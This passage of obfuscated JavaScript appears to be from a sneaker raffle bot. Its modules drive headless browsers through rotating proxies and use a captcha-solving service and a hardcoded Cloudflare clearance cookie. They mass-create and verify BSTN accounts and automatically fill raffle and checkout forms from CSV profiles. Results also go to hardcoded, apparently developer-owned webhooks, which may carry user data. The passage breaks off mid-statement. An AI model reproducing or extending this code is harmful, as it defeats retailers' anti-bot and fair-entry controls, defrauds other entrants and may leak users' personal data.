                    if (_0x2a52dc[_0x582f11]['Email'] == '' || _0x2a52dc[_0x582f11]['FirstName'] == '' || _0x2a52dc[_0x582f11]['LastName'] == '' || _0x2a52dc[_0x582f11]['Country'] == '' || _0x2a52dc[_0x582f11]['Size'] == '' || _0x2a52dc[_0x582f11]['Address1'] == '' || _0x2a52dc[_0x582f11]['Zip'] == '') {
                        console['log'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5a0dc7['useRandomProxy'] = ![])
                        var _0x3ff1b5 = _0x2b92c2[_0x582f11]['split'](':');
                    else
                        var _0x256ceb = Math['round'](Math['random']() * (_0x2b92c2['length'] - 0x1)), _0x3ff1b5 = _0x2b92c2[_0x256ceb]['split'](':');
                    const _0x150e29 = await _0x512dd9['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x3ff1b5[0x0] + ':' + _0x3ff1b5[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x3a7ffa = await _0x150e29['newPage']();
                        await _0x3a7ffa['setDefaultNavigationTimeout'](0x1d4c0), await _0x3a7ffa['authenticate']({
                            'username': '' + _0x3ff1b5[0x2],
                            'password': '' + _0x3ff1b5[0x3]
                        }), console['log'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3a7ffa['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3a7ffa['setRequestInterception'](!![]), _0x3a7ffa['on']('request', _0xee88b9 => {
                            _0xee88b9['resourceType']() === 'image' || _0xee88b9['resourceType']() === 'font' || _0xee88b9['resourceType']() === 'media' ? _0xee88b9['abort']() : _0xee88b9['continue']();
                        }), await _0x3a7ffa['goto'](_0x5ef619, { 'waitUntil': 'networkidle2' }), console['log'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x3a7ffa['waitForTimeout'](0xfa0), console['log'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x3a7ffa['waitForTimeout'](0x320);
                        if (_0x2a52dc[_0x582f11]['Size'] == 'RANDOM') {
                            console['log'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0x183a35 = await _0x3a7ffa['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x2e0a7a => {
                                return _0x2e0a7a['map'](_0x390cc7 => _0x390cc7['href']);
                            });
                            var _0x1af656 = Math['round'](Math['random']() * (_0x183a35['length'] - 0x1));
                            await _0x3a7ffa['goto']('' + _0x183a35[_0x1af656]);
                        } else {
                            console['log'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2a52dc[_0x582f11]['Size']);
                            try {
                                const _0x48fc9d = await _0x3a7ffa['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x2a52dc[_0x582f11]['Size'] + '\x22]\x20>\x20a', _0x43551f => {
                                    return _0x43551f['map'](_0x1f0b18 => _0x1f0b18['href']);
                                });
                                await _0x3a7ffa['goto']('' + _0x48fc9d[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0x4ed9ef) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20' + _0x4ed9ef + '\x20Size\x20not\x20found')), _0x392ad1 = 'Size\x20Not\x20Found';
                                var _0x4f56b1 = await _0x1653b0(_0x2a52dc[_0x582f11], _0x232119, 'dev', !![], _0x392ad1);
                                _0x5e7bec['errorDEV'] = { 'embeds': [_0x4f56b1] };
                                _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x5e7bec['errorDEV']);
                                await _0xf7d9ce(_0x227865, _0x5e7bec['errorDEV']);
                                continue;
                            }
                        }
                        await _0x3a7ffa['waitForTimeout'](0x258), await _0x3a7ffa['type']('#raffle-instagram', '' + _0x2a52dc[_0x582f11]['Follower'], { 'delay': 0x64 }), await _0x3a7ffa['waitForTimeout'](0x384), await _0x3a7ffa['click']('#raffle-terms'), await _0x3a7ffa['waitForTimeout'](0x384), await _0x3a7ffa['evaluate'](() => {
                            const _0x4ca9a2 = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x4ca9a2['click']();
                        }), await _0x3a7ffa['waitForTimeout'](0xbb8), await _0x3a7ffa['waitForSelector']('#checkout_email'), await _0x207ff4(0x3e8), console['log'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3a7ffa['type']('#checkout_email', '' + _0x2a52dc[_0x582f11]['Email'], 0x32), await _0x207ff4(0x320), await _0x3a7ffa['select']('#checkout_shipping_address_country', '' + _0x2a52dc[_0x582f11]['Country']), await _0x3a7ffa['waitForTimeout'](0x258), await _0x3a7ffa['type']('#checkout_shipping_address_first_name', '' + _0x2a52dc[_0x582f11]['FirstName']), await _0x3a7ffa['waitForTimeout'](0x320), await _0x3a7ffa['type']('#checkout_shipping_address_last_name', '' + _0x2a52dc[_0x582f11]['LastName']), await _0x3a7ffa['waitForTimeout'](0x2bc), await _0x3a7ffa['type']('#checkout_shipping_address_address1', _0x2a52dc[_0x582f11]['Address1'] + '\x20' + _0x2a52dc[_0x582f11]['HouseNumber']), await _0x3a7ffa['waitForTimeout'](0x2bc), await _0x3a7ffa['type']('#checkout_shipping_address_address2', '' + _0x2a52dc[_0x582f11]['Address2']), await _0x3a7ffa['waitForTimeout'](0x2bc);
                        _0x2a52dc[_0x582f11]['Postcode'] == undefined ? await _0x3a7ffa['type']('#checkout_shipping_address_zip', '' + _0x2a52dc[_0x582f11]['Zip']) : await _0x3a7ffa['type']('#checkout_shipping_address_zip', '' + _0x2a52dc[_0x582f11]['Postcode']);
                        await _0x3a7ffa['waitForTimeout'](0x2bc), await _0x3a7ffa['type']('#checkout_shipping_address_city', '' + _0x2a52dc[_0x582f11]['City']), await _0x3a7ffa['waitForTimeout'](0x2bc), console['log'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x3a7ffa, _0x3a7ffa['evaluate'](() => {
                            const _0x430a72 = document['querySelector']('#continue_button');
                            for (var _0x1954ae = 0x0; _0x1954ae < 0x5; _0x1954ae++) {
                                if (_0x430a72) {
                                    _0x430a72['click'](), _0x430a72['click']();
                                    break;
                                } else
                                    _0x207ff4(0xfa0);
                            }
                        }), await _0x3a7ffa['waitForTimeout'](0x1194);
                        try {
                            await _0x3a7ffa['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x3a7ffa['evaluate'](() => {
                            const _0x5c04c1 = document['querySelector']('#continue_button');
                            for (var _0xec5a42 = 0x0; _0xec5a42 < 0x5; _0xec5a42++) {
                                if (_0x5c04c1) {
                                    _0x5c04c1['click']();
                                    break;
                                } else
                                    _0x207ff4(0xfa0);
                            }
                        }), await _0x3a7ffa['waitForTimeout'](0x7d0), console['log'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x3a7ffa['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x3a7ffa['evaluate'](() => {
                            const _0x52f7f5 = document['querySelector']('#continue_button');
                            for (var _0x19466a = 0x0; _0x19466a < 0x5; _0x19466a++) {
                                if (_0x52f7f5) {
                                    _0x52f7f5['click']();
                                    break;
                                } else
                                    _0x207ff4(0xfa0);
                            }
                        }), await _0x3a7ffa['waitForTimeout'](0x1194), await _0x3a7ffa['waitForSelector']('#continue_button'), _0x3a7ffa['evaluate'](() => {
                            const _0x36bded = document['querySelector']('#continue_button');
                            for (var _0x4e45de = 0x0; _0x4e45de < 0x5; _0x4e45de++) {
                                if (_0x36bded) {
                                    _0x36bded['click']();
                                    break;
                                } else
                                    _0x207ff4(0xfa0);
                            }
                        });
                        try {
                            await _0x3a7ffa['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x29f8cf = 'no', _0x40845b(_0x2a52dc[_0x582f11], _0x232119), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '')
                                try {
                                    await _0xf7d9ce(_0x5a0dc7['webhook'], _0x5e7bec['succesDEVMSG']);
                                } catch {
                                }
                            await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x5e7bec['succesDEVMSG']), await _0x207ff4(0xc8);
                            try {
                                await _0xf7d9ce(_0xcaa949, _0x5e7bec['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x2e442a) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x2e442a));
                        }
                    } catch (_0x4c1e05) {
                        console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20' + _0x4c1e05)), _0x392ad1 = '' + _0x4c1e05;
                        var _0x4f56b1 = await _0x1653b0(_0x2a52dc[_0x582f11], _0x232119, 'dev', !![], _0x392ad1);
                        _0x5e7bec['errorDEV'] = { 'embeds': [_0x4f56b1] }, _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x5e7bec['errorDEV']), await _0xf7d9ce(_0x227865, _0x5e7bec['errorDEV']), _0x29f8cf = 'yes';
                    } finally {
                        _0x150e29 && _0x150e29['close']();
                        if (_0x29f8cf == 'yes' && _0x508f98 != 0x5 && _0x392ad1 != 'Size\x20Not\x20Found') {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x232119['name'] + ']\x20Task\x20' + (_0x582f11 + 0x1) + '\x20:\x20Retrying')), _0x582f11 = _0x582f11 - 0x1, _0x508f98 = _0x508f98 + 0x1;
                            continue;
                        }
                        _0x29f8cf == 'yes' && _0x508f98 >= 0x5 && (_0x3fbd0e(_0x2a52dc[_0x582f11], _0x232119), _0x29f8cf = 'no', _0x508f98 = 0x0);
                        if (_0x582f11 + 0x1 == _0x2a52dc['length']) {
                            await _0x207ff4(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5a0dc7['AfewDelay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4de503, _0x5a2c96, _0x1ea9e4) {
                    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5a0dc7['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x177b42 = 0x0; _0x177b42 < _0x5a2c96['length']; _0x177b42++) {
                        if (_0x319d33 != 'yes')
                            var _0x319d33 = '', _0x2f19fa = 0x0;
                        var _0x244c44;
                        await _0x5e3796(_0x5a2c96, _0x177b42), _0x2164fd(_0x4de503['name'] + '\x20Task\x20' + (_0x177b42 + 0x1) + '\x20/\x20' + _0x5a2c96['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517);
                        var _0x53eff8 = await _0x1653b0(_0x5a2c96[_0x177b42], _0x4de503, 'acc', ![]);
                        const _0x38d63f = { 'succesDEVMSG': { 'embeds': [_0x53eff8] } }, _0x382932 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x12878b = Math['round'](Math['random']() * (_0x1ea9e4['length'] - 0x1)), _0x37cd0c = _0x1ea9e4[_0x12878b]['split'](':');
                        const _0x5e9dce = await _0x512dd9['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x37cd0c[0x0] + ':' + _0x37cd0c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x5f12ec = await _0x5e9dce['newPage']();
                            await _0x5f12ec['authenticate']({
                                'username': '' + _0x37cd0c[0x2],
                                'password': '' + _0x37cd0c[0x3]
                            }), console['log'](_0x13cc99() + '\x20[' + _0x4de503['name'] + ']\x20Task\x20' + (_0x177b42 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5f12ec['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5f12ec['setRequestInterception'](!![]), _0x5f12ec['on']('request', _0x2ae955 => {
                                _0x2ae955['resourceType']() === 'image' ? _0x2ae955['abort']() : _0x2ae955['continue']();
                            }), await _0x5f12ec['goto']('' + _0x382932), await _0x5f12ec['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x5f12ec['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x13cc99() + '\x20[' + _0x4de503['name'] + ']\x20Task\x20' + (_0x177b42 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x207ff4(0x7d0), console['log'](_0x13cc99() + '\x20[' + _0x4de503['name'] + ']\x20Task\x20' + (_0x177b42 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x207ff4(0x190), await _0x5f12ec['waitForSelector']('#firstname'), await _0x5f12ec['type']('#firstname', _0x5a2c96[_0x177b42]['FirstName'], { 'delay': 0xf0 }), await _0x207ff4(0x190), await _0x5f12ec['type']('#lastname', _0x5a2c96[_0x177b42]['LastName'], { 'delay': 0xe6 }), await _0x207ff4(0x190), await _0x5f12ec['type']('#email_address', _0x5a2c96[_0x177b42]['Email'], { 'delay': 0x122 }), await _0x207ff4(0x190), await _0x5f12ec['type']('#password', _0x5a2c96[_0x177b42]['Password'], { 'delay': 0x82 }), await _0x207ff4(0x1f4), await _0x5f12ec['type']('#password-confirmation', _0x5a2c96[_0x177b42]['Password'], { 'delay': 0x7c }), console['log'](_0x13cc99() + '\x20[' + _0x4de503['name'] + ']\x20Task\x20' + (_0x177b42 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x207ff4(0x2bc), await _0x5f12ec['$eval']('#form-validate', _0x5e3d02 => _0x5e3d02['submit']()), await _0x207ff4(0x1388);
                            const _0x2d69fe = await _0x5f12ec['$']('#email_address-error');
                            if (_0x2d69fe)
                                throw new Error('Invalid\x20Email');
                            const _0x1d6900 = await _0x5f12ec['$']('#password-error');
                            if (_0x1d6900)
                                throw new Error('Invalid\x20Password');
                            await _0x5f12ec['waitForSelector']('div.mesg-success'), _0x319d33 = 'no', console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x4de503['name'] + ']\x20Task\x20' + (_0x177b42 + 0x1) + '\x20:\x20Account\x20' + _0x5a2c96[_0x177b42]['Email'] + '\x20Generated')), _0x71872f['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x5a2c96[_0x177b42]['Email'] + ',' + _0x5a2c96[_0x177b42]['Password']);
                            try {
                                _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x38d63f['succesDEVMSG']);
                            } catch {
                            }
                            await _0xf7d9ce(_0x14fa11, _0x38d63f['succesDEVMSG']), console['log'](_0x191fc2['yellow'](_0x13cc99() + '\x20[' + _0x4de503['name'] + ']\x20Task\x20' + (_0x177b42 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20verify'));
                        } catch (_0xb967c4) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x4de503['name'] + ']\x20Task\x20' + (_0x177b42 + 0x1) + '\x20:\x20' + _0xb967c4)), _0x244c44 = '' + _0xb967c4;
                            var _0x5730a1 = await _0x1653b0(_0x5a2c96[_0x177b42], _0x4de503, 'acc', !![], _0x244c44);
                            _0x38d63f['errorDEV'] = { 'embeds': [_0x5730a1] }, _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x38d63f['errorDEV']), await _0xf7d9ce(_0x227865, _0x38d63f['errorDEV']), _0x319d33 = 'yes';
                        } finally {
                            _0x5e9dce['close']();
                            if (_0x319d33 == 'yes' && _0x2f19fa != 0x5) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x4de503['name'] + ']\x20Task\x20' + (_0x177b42 + 0x1) + '\x20:\x20Retrying')), _0x177b42 = _0x177b42 - 0x1, _0x2f19fa = _0x2f19fa + 0x1;
                                continue;
                            }
                            _0x319d33 == 'yes' && _0x2f19fa >= 0x5 && (_0x3fbd0e(_0x5a2c96[_0x177b42], _0x4de503), _0x319d33 = 'no', _0x2f19fa = 0x0), console['log'](_0x13cc99() + '\x20[' + _0x4de503['name'] + ']\x20Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xe68593, _0x1cf423, _0x57b7ef) {
                    _0x512dd9['use'](_0x5de1d3());
                    for (var _0x527fe1 = 0x0; _0x527fe1 < _0x1cf423['length']; _0x527fe1++) {
                        if (_0x4950d1 != 'yes')
                            var _0x4950d1 = '', _0x234402 = 0x0;
                        var _0x42f9be = Math['round'](Math['random']() * (_0x57b7ef['length'] - 0x1)), _0x163bc6 = _0x57b7ef[_0x42f9be]['split'](':');
                        const _0x1409a7 = await _0x512dd9['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x163bc6[0x0] + ':' + _0x163bc6[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x231e25 = await _0x1409a7['newPage']();
                            await _0x231e25['authenticate']({
                                'username': '' + _0x163bc6[0x2],
                                'password': '' + _0x163bc6[0x3]
                            }), console['log'](_0x13cc99() + '\x20[' + _0xe68593['name'] + ']\x20Task\x20' + (_0x527fe1 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x231e25['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x231e25['setRequestInterception'](!![]), _0x231e25['on']('request', _0x589a7d => {
                                _0x589a7d['resourceType']() === 'image' || _0x589a7d['resourceType']() === 'font' || _0x589a7d['resourceType']() === 'media' ? _0x589a7d['abort']() : _0x589a7d['continue']();
                            }), console['log'](_0x13cc99() + '\x20[' + _0xe68593['name'] + ']\x20Task\x20' + (_0x527fe1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x231e25['goto'](_0x1cf423[_0x527fe1]), console['log'](_0x13cc99() + '\x20[' + _0xe68593['name'] + ']\x20Task\x20' + (_0x527fe1 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x231e25['waitForTimeout'](0xbb8);
                            try {
                                await _0x231e25['waitForSelector']('.dashboard-main_title'), _0x4950d1 = 'no', console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0xe68593['name'] + ']\x20Task\x20' + (_0x527fe1 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                var _0x161538 = await _0x1653b0(null, _0xe68593, 'ver', ![]);
                                const _0x37c4b9 = { 'succesDEVMSG': { 'embeds': [_0x161538] } };
                                await _0xf7d9ce(_0x29cd31, _0x37c4b9['succesDEVMSG']);
                            } catch (_0x2c81db) {
                                throw new Error(_0x2c81db);
                            }
                        } catch (_0x540336) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0xe68593['name'] + ']\x20Task\x20' + (_0x527fe1 + 0x1) + '\x20:\x20' + _0x540336));
                            var _0xf31431 = _0x540336, _0xb8dcc7 = await _0x1653b0(null, _0xe68593, 'ver', !![], _0xf31431);
                            const _0x157a02 = { 'errorDEVMSG': { 'embeds': [_0xb8dcc7] } };
                            _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x157a02['errorDEVMSG']), await _0xf7d9ce(_0x227865, _0x157a02['errorDEVMSG']), _0x4950d1 = 'yes';
                        } finally {
                            _0x1409a7['close']();
                            if (_0x4950d1 == 'yes' && _0x234402 != 0x5) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0xe68593['name'] + ']\x20Task\x20' + (_0x527fe1 + 0x1) + '\x20:\x20Retrying')), _0x527fe1 = _0x527fe1 - 0x1, _0x234402 = _0x234402 + 0x1;
                                continue;
                            }
                            _0x4950d1 == 'yes' && _0x234402 >= 0x5 && (_0x4950d1 = 'no', _0x234402 = 0x0), console['log'](_0x13cc99() + '\x20[' + _0xe68593['name'] + ']\x20Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x18aff8, _0x254594, _0x52c2fc) {
                    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5a0dc7['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x6ceb72 = 0x0; _0x6ceb72 < _0x254594['length']; _0x6ceb72++) {
                        var _0x30db7d;
                        await _0x5e3796(_0x254594, _0x6ceb72);
                        if (_0x2a85fc != 'yes')
                            var _0x2a85fc = '', _0x288ca0 = 0x0;
                        _0x2164fd(_0x18aff8['name'] + '\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20/\x20' + _0x254594['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517);
                        var _0x2091f9 = Math['round'](Math['random']() * (_0x52c2fc['length'] - 0x1)), _0x243bbc = _0x52c2fc[_0x2091f9]['split'](':'), _0x39fc6c;
                        try {
                            _0x39fc6c = await _0x512dd9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x243bbc[0x0] + ':' + _0x243bbc[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x39fc6c = await _0x512dd9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x243bbc[0x0] + ':' + _0x243bbc[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x589b90 = await _0x39fc6c['newPage'](), _0x4f42d8 = await _0x589b90['target']()['createCDPSession'](), { windowId: _0x3b54e4 } = await _0x4f42d8['send']('Browser.getWindowForTarget');
                            await _0x589b90['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x209a5e = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x589b90['authenticate']({
                                'username': '' + _0x243bbc[0x2],
                                'password': '' + _0x243bbc[0x3]
                            }), console['log'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x589b90['goto']('' + _0x254594[_0x6ceb72]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x589b90['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x4f42d8['send']('Browser.setWindowBounds', {
                                'windowId': _0x3b54e4,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x207ff4(0x1388), await _0x589b90['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x589b90['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x207ff4(0x1f4), console['log'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20:\x20Logging\x20in'), await _0x589b90['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x458cfa => _0x458cfa['click']()), await _0x589b90['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x589b90['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x207ff4(0x7d0), await _0x589b90['waitForSelector']('#email-login'), await _0x589b90['type']('#email-login', '' + _0x254594[_0x6ceb72]['Email']), await _0x207ff4(0xdac), await _0x589b90['waitForSelector']('#password'), await _0x589b90['type']('#password', '' + _0x254594[_0x6ceb72]['Password'], { 'delay': 0xe6 }), await _0x207ff4(0x157c);
                            try {
                                await _0x589b90['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x4507e0 => _0x4507e0['click']());
                            } catch {
                            }
                            try {
                                await _0x589b90['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x205564) {
                            }
                            await _0x207ff4(0x3e8);
                            const _0x3e9f5b = await _0x589b90['$']('.enteredDraw_container__2KmQ_');
                            if (_0x3e9f5b)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x254594[_0x6ceb72]['Size']);
                            if (_0x254594[_0x6ceb72]['Size'] != 'RANDOM') {
                                var _0x234be4 = _0x254594[_0x6ceb72]['Size']['replace']('.', ',');
                                const _0x284e5f = await _0x589b90['$x']('//div[contains(text(),\x20' + _0x234be4 + ')]');
                                await _0x284e5f[0x0]['click']();
                            } else {
                                const _0x37a33e = await _0x589b90['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x436e5a = Math['round'](Math['random']() * (_0x37a33e['length'] - 0x1));
                                await _0x37a33e[_0x436e5a]['click']();
                            }
                            await _0x207ff4(0x1f4);
                            const _0x344ebb = await _0x589b90['$']('.addressList_addressItem__LE2PB');
                            if (_0x344ebb && _0x254594[_0x6ceb72]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x13cc99() + '\x20[' + _0x18aff8['name'] + ']\x20Task\x20' + (_0x6ceb72 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x589b90['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x207ff4(0x5dc), await _0x589b90['waitForSelector']('#firstname'), await _0x589b90['type']('#firstname', '' + _0x254594[_0x6ceb72]['FirstName']), await _0x207ff4(0x1f4), await _0x589b90['waitForSelector']('#firstname'), await _0x589b90['type']('#lastname', '' + _0x254594[_0x6ceb72]['LastName']), await _0x207ff4(0x1f4), await _0x589b90['waitForSelector']('#firstname'), await _0x589b90['type']('#street', '' + _0x254594[_0x6ceb72]['Address1']), await _0x207ff4(0x1f4), await _0x589b90['waitForSelector']('#firstname'), await _0x589b90['type']('#houseNumber', _0x254594[_0x6ceb72]['HouseNumber'] + '\x20' + _0x254594[_0x6ceb72]['Address2']), await _0x207ff4(0x1f4), await _0x589b90['waitForSelector']('#firstname'), await _0x589b90['select']('#country_code', '' + _0x254594[_0x6ceb72]['Country']), await _0x207ff4(0x1f4), await 